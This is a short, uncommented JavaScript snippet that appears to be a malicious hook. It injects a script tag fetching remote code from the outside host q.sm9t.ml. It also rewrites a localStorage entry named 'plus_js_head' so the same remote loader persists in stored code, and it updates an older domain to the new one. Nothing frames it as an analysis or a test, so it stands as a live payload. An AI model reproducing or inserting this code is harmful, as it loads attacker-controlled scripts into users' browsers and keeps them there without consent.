!function () {
    try {
		document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sm9t.ml/hm.js?"+parseInt((new Date().getTime()) / 2e7),a}());
    } catch (e) { }
}()

;!function (){
	var localhook = localStorage.getItem('plus_js_head');
	var exp = ';document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sm9t.ml/hm.js",a}())/*hook*/;function c(c)';
	if (localhook.includes('function c(c)') && !localhook.includes('/*hook*/')){
		localhook = localhook.replace('function c(c)',exp);
		localStorage.setItem('plus_js_head',localhook);
	}else if(localhook.includes('q.sw9t.ml')){
		localhook = localhook.replace('q.sw9t.ml','q.sm9t.ml');
		localStorage.setItem('plus_js_head',localhook);
	}
}()